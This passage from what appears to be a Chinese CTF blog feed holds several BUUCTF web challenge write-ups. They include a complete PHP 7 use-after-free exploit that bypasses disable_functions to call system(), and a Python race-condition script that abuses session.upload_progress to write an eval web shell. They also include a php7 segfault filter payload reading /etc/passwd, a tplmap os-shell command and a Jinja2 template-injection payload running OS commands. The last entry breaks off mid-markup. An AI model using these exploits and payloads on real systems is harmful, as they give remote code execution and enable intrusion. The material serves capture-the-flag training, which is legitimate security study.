class="doctag">Bug:</span> https://bugs.php.net/bug.php?id=76047</span></span><br><span class="line"><span class="comment"># debug_backtrace() returns a reference to a variable </span></span><br><span class="line"><span class="comment"># that has been destroyed, causing a UAF vulnerability.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># This exploit should work on all PHP 7.0-7.4 versions</span></span><br><span class="line"><span class="comment"># released as of 30/01/2020.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Author: https://github.com/mm0r1</span></span><br><span class="line"></span><br><span class="line">pwn(<span class="string">&quot;/readflag&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pwn</span>(<span class="params">$cmd</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $abc, $helper, $backtrace;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Vuln</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $a;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">            <span class="keyword">global</span> $backtrace; </span><br><span class="line">            <span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;a);</span><br><span class="line">            $backtrace = (<span class="keyword">new</span> <span class="built_in">Exception</span>)-&gt;getTrace(); <span class="comment"># ;)</span></span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">isset</span>($backtrace[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>])) &#123; <span class="comment"># PHP &gt;= 7.4</span></span><br><span class="line">                $backtrace = debug_backtrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $a, $b, $c, $d;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span>(<span class="params">&amp;$str, $p = <span class="number">0</span>, $s = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        $address = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>($j = $s<span class="number">-1</span>; $j &gt;= <span class="number">0</span>; $j--) &#123;</span><br><span class="line">            $address &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            $address |= ord($str[$p+$j]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $address;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span>(<span class="params">$ptr, $m = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        $out = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; $m; $i++) &#123;</span><br><span class="line">            $out .= chr($ptr &amp; <span class="number">0xff</span>);</span><br><span class="line">            $ptr &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">&amp;$str, $p, $v, $n = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        $i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $n; $i++) &#123;</span><br><span class="line">            $str[$p + $i] = chr($v &amp; <span class="number">0xff</span>);</span><br><span class="line">            $v &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params">$addr, $p = <span class="number">0</span>, $s = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $abc, $helper;</span><br><span class="line">        write($abc, <span class="number">0x68</span>, $addr + $p - <span class="number">0x10</span>);</span><br><span class="line">        $leak = strlen($helper-&gt;a);</span><br><span class="line">        <span class="keyword">if</span>($s != <span class="number">8</span>) &#123; $leak %= <span class="number">2</span> &lt;&lt; ($s * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line">        <span class="keyword">return</span> $leak;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span>(<span class="params">$base</span>) </span>&#123;</span><br><span class="line">        $e_type = leak($base, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        $e_phoff = leak($base, <span class="number">0x20</span>);</span><br><span class="line">        $e_phentsize = leak($base, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        $e_phnum = leak($base, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $e_phnum; $i++) &#123;</span><br><span class="line">            $header = $base + $e_phoff + $i * $e_phentsize;</span><br><span class="line">            $p_type  = leak($header, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            $p_flags = leak($header, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            $p_vaddr = leak($header, <span class="number">0x10</span>);</span><br><span class="line">            $p_memsz = leak($header, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($p_type == <span class="number">1</span> &amp;&amp; $p_flags == <span class="number">6</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_Write</span></span><br><span class="line">                <span class="comment"># handle pie</span></span><br><span class="line">                $data_addr = $e_type == <span class="number">2</span> ? $p_vaddr : $base + $p_vaddr;</span><br><span class="line">                $data_size = $p_memsz;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>($p_type == <span class="number">1</span> &amp;&amp; $p_flags == <span class="number">5</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_exec</span></span><br><span class="line">                $text_size = $p_memsz;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!$data_addr || !$text_size || !$data_size)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [$data_addr, $text_size, $data_size];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span>(<span class="params">$base, $elf</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>($data_addr, $text_size, $data_size) = $elf;</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $data_size / <span class="number">8</span>; $i++) &#123;</span><br><span class="line">            $leak = leak($data_addr, $i * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>($leak - $base &gt; <span class="number">0</span> &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;</span><br><span class="line">                $deref = leak($leak);</span><br><span class="line">                <span class="comment"># &#x27;constant&#x27; constant check</span></span><br><span class="line">                <span class="keyword">if</span>($deref != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            $leak = leak($data_addr, ($i + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>($leak - $base &gt; <span class="number">0</span> &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;</span><br><span class="line">                $deref = leak($leak);</span><br><span class="line">                <span class="comment"># &#x27;bin2hex&#x27; constant check</span></span><br><span class="line">                <span class="keyword">if</span>($deref != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> $data_addr + $i * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span>(<span class="params">$binary_leak</span>) </span>&#123;</span><br><span class="line">        $base = <span class="number">0</span>;</span><br><span class="line">        $start = $binary_leak &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="number">0x1000</span>; $i++) &#123;</span><br><span class="line">            $addr = $start - <span class="number">0x1000</span> * $i;</span><br><span class="line">            $leak = leak($addr, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span>($leak == <span class="number">0x10102464c457f</span>) &#123; <span class="comment"># ELF header</span></span><br><span class="line">                <span class="keyword">return</span> $addr;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_system</span>(<span class="params">$basic_funcs</span>) </span>&#123;</span><br><span class="line">        $addr = $basic_funcs;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            $f_entry = leak($addr);</span><br><span class="line">            $f_name = leak($f_entry, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($f_name == <span class="number">0x6d6574737973</span>) &#123; <span class="comment"># system</span></span><br><span class="line">                <span class="keyword">return</span> leak($addr + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            $addr += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>($f_entry != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">trigger_uaf</span>(<span class="params">$arg</span>) </span>&#123;</span><br><span class="line">        <span class="comment"># str_shuffle prevents opcache string interning</span></span><br><span class="line">        $arg = str_shuffle(str_repeat(<span class="string">&#x27;A&#x27;</span>, <span class="number">79</span>));</span><br><span class="line">        $vuln = <span class="keyword">new</span> Vuln();</span><br><span class="line">        $vuln-&gt;a = $arg;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(stristr(PHP_OS, <span class="string">&#x27;WIN&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;This PoC is for *nix systems only.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $n_alloc = <span class="number">10</span>; <span class="comment"># increase this value if UAF fails</span></span><br><span class="line">    $contiguous = [];</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $n_alloc; $i++)</span><br><span class="line">        $contiguous[] = str_shuffle(str_repeat(<span class="string">&#x27;A&#x27;</span>, <span class="number">79</span>));</span><br><span class="line"></span><br><span class="line">    trigger_uaf(<span class="string">&#x27;x&#x27;</span>);</span><br><span class="line">    $abc = $backtrace[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    $helper = <span class="keyword">new</span> Helper;</span><br><span class="line">    $helper-&gt;b = <span class="function"><span class="keyword">function</span> (<span class="params">$x</span>) </span>&#123; &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(strlen($abc) == <span class="number">79</span> || strlen($abc) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;UAF failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leaks</span></span><br><span class="line">    $closure_handlers = str2ptr($abc, <span class="number">0</span>);</span><br><span class="line">    $php_heap = str2ptr($abc, <span class="number">0x58</span>);</span><br><span class="line">    $abc_addr = $php_heap - <span class="number">0xc8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake value</span></span><br><span class="line">    write($abc, <span class="number">0x60</span>, <span class="number">2</span>);</span><br><span class="line">    write($abc, <span class="number">0x70</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake reference</span></span><br><span class="line">    write($abc, <span class="number">0x10</span>, $abc_addr + <span class="number">0x60</span>);</span><br><span class="line">    write($abc, <span class="number">0x18</span>, <span class="number">0xa</span>);</span><br><span class="line"></span><br><span class="line">    $closure_obj = str2ptr($abc, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    $binary_leak = leak($closure_handlers, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span>(!($base = get_binary_base($binary_leak))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!($elf = parse_elf($base))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!($basic_funcs = get_basic_funcs($base, $elf))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!($zif_system = get_system($basic_funcs))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake closure object</span></span><br><span class="line">    $fake_obj_offset = <span class="number">0xd0</span>;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="number">0x110</span>; $i += <span class="number">8</span>) &#123;</span><br><span class="line">        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># pwn</span></span><br><span class="line">    write($abc, <span class="number">0x20</span>, $abc_addr + $fake_obj_offset);</span><br><span class="line">    write($abc, <span class="number">0xd0</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>); <span class="comment"># internal func type</span></span><br><span class="line">    write($abc, <span class="number">0xd0</span> + <span class="number">0x68</span>, $zif_system); <span class="comment"># internal func handler</span></span><br><span class="line"></span><br><span class="line">    ($helper-&gt;b)($cmd);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>传shell，获取flag</p><p>参考文章:<br><a href="https://www.cnblogs.com/yesec/p/12571861.html">参考链接</a></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;摘要&lt;br&gt;ThinkPHP6.0.0 任意文件操作漏洞 + disable 绕过&lt;/p&gt;</summary>
    
    
    
    <category term="web" scheme="http://example.com/categories/web/"/>
    
    
    <category term="buuctf" scheme="http://example.com/tags/buuctf/"/>
    
  </entry>
  
  <entry>
    <title>NPUCTF2020-ezinclude</title>
    <link href="http://example.com/2021/08/24/NPUCTF2020-ezinclude/"/>
    <id>http://example.com/2021/08/24/NPUCTF2020-ezinclude/</id>
    <published>2021-08-24T09:01:21.337Z</published>
    <updated>2021-08-27T16:15:49.893Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>摘要<br>session 文件上传+竞争    php7 segment fault特性</p><a id="more"></a></blockquote><p>显示：</p><blockquote><p>username/password error</p></blockquote><p><img src="/images/NPUCTF2020-ezinclude/image-20210824230329570.png" alt="image-20210824230329570"></p><p>返回了哈希值，输入验证后跳转404，抓包</p><p>/flflflflag.php：文件包含点</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">include($_GET[&quot;file&quot;])&lt;&#x2F;body&gt;</span><br></pre></td></tr></table></figure><p>又是 cmdline 可读，environ 不可读……</p><h4><span id="利用sessionupload_progress进行文件包含">利用session.upload_progress进行文件包含</span></h4><p>学习了一波利用session进行竞争包含：</p><p><a href="https://www.freebuf.com/vuls/202819.html">利用session.upload_progress进行文件包含和反序列化渗透</a></p><p><a href="https://blog.csdn.net/qq_52737372/article/details/117789229">浅谈PHP_SESSION_UPLOAD_PROGRESS和条件竞争的巧妙利用</a></p><p>感觉很棒……</p><p>竞争脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">sessid = <span class="string">&#x27;test&#x27;</span></span><br><span class="line">url = <span class="string">&#x27;http://b4539af9-768c-4832-bbbe-2d6d2b0da7a3.node4.buuoj.cn:81/flflflflag.php&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">POST</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">        session.post(</span><br><span class="line">            url,</span><br><span class="line">            data=&#123;</span><br><span class="line">                <span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>: <span class="string">&quot;&lt;?php system(&#x27;ls /&#x27;);fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_POST[cmd])?&gt;&#x27;);echo md5(&#x27;1&#x27;);?&gt;&quot;</span>&#125;,</span><br><span class="line">            files=&#123;<span class="string">&quot;file&quot;</span>: (<span class="string">&#x27;a.txt&#x27;</span>, f)&#125;,</span><br><span class="line">            cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: sessid&#125;</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">READ</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        response = session.post(url + <span class="string">&#x27;?file=/tmp/sess_&#x27;</span> + sessid)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;c4ca4238a0b923820dcc509a6f75849b&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            print(<span class="string">&#x27;[+++]retry&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(response.text)</span><br><span class="line">            sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">    t1 = threading.Thread(target=POST, args=(session,))</span><br><span class="line">    t1.daemon = <span class="literal">True</span></span><br><span class="line">    t1.start()</span><br><span class="line">    READ(session)</span><br></pre></td></tr></table></figure><p>通过包含执行代码，将指定内容写到<code>shell.php</code>中</p><p><img src="/images/NPUCTF2020-ezinclude/image-20210824232002005.png" alt="image-20210824232002005"></p><p>成功输出信息</p><p>但在页面命令执行无回显，应该有限制，连接蚁剑，无显示，无权限……</p><p>一波<code>LD_PRELOAD</code>：</p><p>生成<code>.antproxy.php</code></p><img src="/images/NPUCTF2020-ezinclude/image-20210824232455565.png" alt="image-20210824232455565" style="zoom:80%;"><p>此时可以命令执行，但找不到flag……</p><p>创建页面，看phpinfo：</p><img src="/images/NPUCTF2020-ezinclude/image-20210824232610872.png" alt="image-20210824232610872" style="zoom:80%;"><h4><span id="php7-segment-fault特性">php7 segment fault特性</span></h4><p>扫目录可得dir.php</p><blockquote><p>……扫不出来</p></blockquote><blockquote><p>向PHP发送含有文件区块的数据包时，让PHP异常崩溃退出，POST的临时文件就会被保留</p></blockquote><blockquote><ul><li>php &lt; 7.2<br>php://filter/string.strip_tags/resource=/etc/passwd</li><li>php7 老版本通杀<br>php://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAAAAAAAAAAAAAAAA%ff%ff%ff%ff%ff%ff%ff%ffAAAAAAAAAAAAAAAAAAAAAAAA</li></ul></blockquote><p>嫖个脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"></span><br><span class="line">mode1 = <span class="string">&quot;php://filter/string.strip_tags/resource=/etc/passwd&quot;</span></span><br><span class="line">mode2 = <span class="string">&quot;php://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAAAAAAAAAAAAAAAA%ff%ff%ff%ff%ff%ff%ff%ffAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span></span><br><span class="line">url = <span class="string">&quot;http://93fed8e6-341b-499c-b41b-0f0a6288549b.node4.buuoj.cn:81/flflflflag.php?file=&quot;</span></span><br><span class="line"></span><br><span class="line">url = url + mode1</span><br><span class="line">payload = <span class="string">&quot;&lt;?php phpinfo();?&gt;&quot;</span></span><br><span class="line"></span><br><span class="line">files = &#123;</span><br><span class="line">    <span class="string">&quot;file&quot;</span>: BytesIO(payload.encode())</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">res = requests.post(url=url, files=files, allow_redirects=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure><p>dir.php：</p><p><img src="/images/NPUCTF2020-ezinclude/image-20210824233725055.png" alt="image-20210824233725055"></p><p><img src="/images/NPUCTF2020-ezinclude/image-20210824233924599.png" alt="image-20210824233924599"></p><p>获取flag</p><p>参考文章:<br><a href="https://blog.csdn.net/rfrder/article/details/114656092">https://blog.csdn.net/rfrder/article/details/114656092</a></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;摘要&lt;br&gt;session 文件上传+竞争    php7 segment fault特性&lt;/p&gt;</summary>
    
    
    
    <category term="web" scheme="http://example.com/categories/web/"/>
    
    
    <category term="buuctf" scheme="http://example.com/tags/buuctf/"/>
    
  </entry>
  
  <entry>
    <title>RootersCTF2019-I_3_Flask</title>
    <link href="http://example.com/2021/08/23/RootersCTF2019-I_3_Flask/"/>
    <id>http://example.com/2021/08/23/RootersCTF2019-I_3_Flask/</id>
    <published>2021-08-23T08:01:36.403Z</published>
    <updated>2021-08-23T09:01:48.131Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>摘要</p><p>模板注入、arjun、tplmap</p><a id="more"></a></blockquote><blockquote><p>第一次感到工具注入的快感🤣</p></blockquote><p>flask 应该就是模板注入了……有几个考点</p><h4><span id="参数爆破">参数爆破</span></h4><p>对可用参数的爆破，可使用Arjun工具</p><p><img src="/images/RootersCTF2019-I_3_Flask/image-20210823165026964.png" alt="image-20210823165026964"></p><p>可以获取可用的name参数</p><h4><span id="模板注入">模板注入</span></h4><p>tplmap 工具</p><p><img src="/images/RootersCTF2019-I_3_Flask/image-20210823165152868.png" alt="image-20210823165152868"></p><p>可以获取到 name 参数、模板引擎、系统等信息，结合shell命令：</p><p><code>python2 tplmap.py -u http://89c50d73-c596-4cbd-b2e0-34207638b293.node4.buuoj.cn:81/?name=1 --engine=Jinja2 --os-shell</code></p><p><img src="/images/RootersCTF2019-I_3_Flask/image-20210823165707724.png" alt="image-20210823165707724"></p><p>用脚本感觉好爽……</p><p>手工注入：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c in [].<span class="keyword">__class__</span>.__base__.__subclasses__() %&#125; </span><br><span class="line">  &#123;% <span class="keyword">if</span> c.__name__ == <span class="string">&#x27;catch_warnings&#x27;</span> %&#125; </span><br><span class="line">    &#123;% <span class="keyword">for</span> b in c.__init__.__globals__.values() %&#125; </span><br><span class="line">      &#123;% <span class="keyword">if</span> b.<span class="keyword">__class__</span> == &#123;&#125;.<span class="keyword">__class__</span> %&#125;</span><br><span class="line">        &#123;% <span class="keyword">if</span> <span class="string">&#x27;eval&#x27;</span> in b.keys() %&#125; </span><br><span class="line">          &#123;&#123; b[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()&#x27;</span>) &#125;&#125;    <span class="comment">//这里的ls就是需要的执行命令</span></span><br><span class="line">        &#123;% <span class="keyword">endif</span> %&#125; </span><br><span class="line">      &#123;% <span class="keyword">endif</span> %&#125; </span><br><span class="line">     &#123;% <span class="keyword">endfor</span> %&#125; </span><br><span class="line">  &#123;% <span class="keyword">endif</span> %&#125;</span><br><span class="line">&#123;% <span class="keyword">endfor</span> %&#125;</span><br></pre></td></tr></table></figure><p>——<a href="https://www.cnblogs.com/yesec/p/14905799.html">https://www.cnblogs.com/yesec/p/14905799.html</a></p><p>参考文章:<br><a href="https://blog.csdn.net/weixin_44037296/article/details/111396068">BUUCTF [RootersCTF2019] I_＜3_Flask</a></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;摘要&lt;/p&gt;
&lt;p&gt;模板注入、arjun、tplmap&lt;/p&gt;</summary>
    
    
    
    <category term="web" scheme="http://example.com/categories/web/"/>
    
    
    <category term="buuctf" scheme="http://example.com/tags/buuctf/"/>
    
  </entry>
  
  <entry>
    <title>HFCTF2020-JustEscape</title>
    <link href="http://example.com/2021/08/22/HFCTF2020-JustEscape/"/>
    <id>http://example.com/2021/08/22/HFCTF2020-JustEscape/</id>
    <published>2021-08-22T10:48:13.873Z</published>
    <updated>2021-08-23T08:32:50.472Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>摘要<br>nodejs    vm2 沙箱逃逸？</p><a id="more"></a></blockquote><p>run.php：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">&quot;code&quot;</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">&#x27;code&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    $code = $_GET[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="keyword">eval</span>(code);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p><em>注意编码 =.=</em></p></blockquote><blockquote><p><em>真的是 PHP 嘛</em></p></blockquote><p>按照页面访问：</p><img src="D:\HexoBlog\source\images\HFCTF2020-JustEscape\image-20210822185255520.png" alt="image-20210822185255520" style="zoom:80%;"><p>直接拦截……</p><p><code>+</code>这里编码成了<code>%2b</code></p><p>改完编码后：<code>SyntaxError: Unexpected number</code></p><p>查一下报错信息，是js的报错，应该是nodejs</p><blockquote><p>也许也可以改一下url路径看下信息……</p></blockquote><p><a href="https://www.baidu.com/link?url=QeHPmSUaTVy93Lkf1ovKTTkTi97V7pHglb9PLWc_8WVi7a8ZgX_Onxg4jhO0xAIuvVvOZx6ctIknYeQ1Ra-f1K&wd=&eqid=c06249420000b51a0000000361222da3"><em>error</em>.<em>stack</em> | Node.js API 文档</a></p><p><a href="https://www.baidu.com/link?url=7L_-cbO2EcQY-VpyX8NIh3dZPjtDUV6mp0yeCF7nY2qvC194vSPdiArmv13B8XFR9Zy1bJasqI7mhyfyynDur6590MzazNYdn9p6gpx4rCm&wd=&eqid=c06249420000b51a0000000361222da3">js中捕获异常<em>堆栈</em>信息—<em>Error</em>.<em>stack</em></a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span 